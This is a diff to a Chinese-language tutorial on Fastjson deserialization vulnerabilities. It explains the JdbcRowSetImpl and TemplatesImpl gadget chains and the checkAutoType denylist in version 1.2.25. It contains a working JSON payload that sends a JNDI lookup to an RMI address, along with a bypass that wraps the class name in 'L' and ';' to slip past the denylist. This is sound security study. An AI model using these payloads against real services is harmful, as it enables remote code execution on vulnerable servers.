@@ -670,7 +670,7 @@ public class TestJdbcRowSetImpl {
 
 ##### TemplatesImpl利用链
 
-**利用前提**：fastjson显示设置`Feature.SupportNonPublicField`
+**利用前提**：fastjson显示设置`Feature.SupportNonPublicField`，局限性较大，但是无需出网
 
 **Payload**
 
@@ -716,7 +716,7 @@ fastjson的反序列化过程和java原生反序列化过程是不一样的，�
 
 ##### JdbcRowSetImpl利用链
 
-**利用前提**：这里漏洞产生的根本原因是JDNI注入，要满足JNDI注入的条件（详情见JNDI注章节）
+**利用前提**：这里漏洞产生的根本原因是JDNI注入，要满足JNDI注入的条件（详情见JNDI注章节），需要出网
 
 **Payload**
 
@@ -783,17 +783,21 @@ public class Test {
 
 ##### autoType开启的情况下绕过黑名单
 
+**Payload**
+
 ```java
-String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
+String fastSer =  "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
 ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
 JSON.parseObject(fastSer);
 ```
 
-  在<=Fastjson 1.2.24时是默认开启autoType的，在之后都设置为默认关闭。注意到下列变化，loadClass变为了checkAutoType，这个变化很关键
+**分析**
+
+在<=Fastjson 1.2.24时是默认开启autoType的，在之后都设置为默认关闭。注意到下列变化，loadClass变为了checkAutoType，这个变化很关键
 
 ![image-20250116183921007](./images/image-20250116183921007.png)
 
-我们简单看一下这个函数，后面再详细分析：
+我们简单看一下这个函数：
 
 ```java
 public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
@@ -803,7 +807,7 @@ public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
 
     final String className = typeName.replace('$', '.');
 
-    // 如果autoType开启或者这里显式指定了反序列化的类，进入
+    // 如果autoType开启或者expectClass不为null，进入
     if (autoTypeSupport || expectClass != null) {
         // acceptList维护了一个白名单，类以该白名单中的类开头，则进行加载
         // 1.2.25 该名单为空
@@ -823,13 +827,13 @@ public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
         }
     }
 
-    // 后续分析，这里先跳过
+    // 从缓存中读取类
     Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
     if (clazz == null) {
         clazz = deserializers.findClass(typeName);
     }
 
-    // 加载类后，如果显式指定反序列化的类，要进行判断，是否符合
+    // 加载类后，expectClass不为null，要进行判断，是否符合
     if (clazz != null) {
         if (expectClass != null && !expectClass.isAssignableFrom(clazz)) {
             throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
@@ -863,18 +867,21 @@ public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
         }
     }
 
+    // autoType开启，或者expectClass不为null，加载类
     if (autoTypeSupport || expectClass != null) {
         clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
     }
+    
 
     if (clazz != null) {
-
+		 // 指定类的子类，不允许加载，抛出异常
         if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                 || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                 ) {
             throw new JSONException("autoType is not support. " + typeName);
         }
 
+        //  expectClass不为null，进行检查
         if (expectClass != null) {
             if (expectClass.isAssignableFrom(clazz)) {
                 return clazz;
@@ -884,6 +891,7 @@ public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
         }
     }
 
+    // autoType关闭，抛出异常
     if (!autoTypeSupport) {
         throw new JSONException("autoType is not support. " + typeName);
     }
@@ -892,13 +900,65 @@ public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
 }
 ```
 
+在我们开启autoType和没有指定expectClass的情况下，整个调用链还是之前的调用链，要经过代替loadClass的checkAutoType，此时在checkAutoType中的逻辑如下:
+
+```java
+    // 如果autoType开启或者expectClass不为null，进入
+    if (autoTypeSupport || expectClass != null) {
+        // acceptList维护了一个白名单，类以该白名单中的类开头，则进行加载
+        // 1.2.25 该名单为空
+        for (int i = 0; i < acceptList.length; ++i) {
+            String accept = acceptList[i];
+            if (className.startsWith(accept)) {
+                return TypeUtils.loadClass(typeName, defaultClassLoader);
+            }
+        }
+
+        // denyList维护了一个黑名单，类以该黑名单中的类开头，则抛出异常
+        for (int i = 0; i < denyList.length; ++i) {
+            String deny = denyList[i];
+            if (className.startsWith(deny)) {
+                throw new JSONException("autoType is not support. " + typeName);
+            }
+        }
+    }
+    // autoType开启，或者expectClass不为null，加载类
+    if (autoTypeSupport || expectClass != null) {
+        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);
+    }
+    if (clazz != null) {
+		 // 指定类的子类，不允许加载，抛出异常
+        if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
+                || DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
+                ) {
+            throw new JSONException("autoType is not support. " + typeName);
+        }
+    }
+	return clazz;
+```
+
+我们要过两处黑名单检查，后面指定子类就不用看了，`JdbcRowSetImpl`并不是限制的类型，关键在于前面的黑名单检查，fastjson检查是否以如下包名开头
+
+![image-20250120104620910](./images/image-20250120104620910.png)
+
+当然，我们的`com.sun.rowset.JdbcRowSetImpl`，但是我们看一下如果过了黑名单检查，后面还是用的loadClass加载类，loadClass中可以看到如下代码:
+
+```java
+if (className.startsWith("L") && className.endsWith(";")) {
+            String newClassName = className.substring(1, className.length() - 1);
+            return loadClass(newClassName, classLoader);
+        }
+```
+
+这里对类名做了一个裁剪，所以payload中在类的前后加上`L`和`;`，很简单就把黑名单绕过去了
+
 ##### autoType默认关闭的情况下绕过autoType和黑名单
 
 我们还使用之前的Payload打一下
 
 ```java
 String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
-
+ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  //开启autoTypeSupport
 ```
 
 
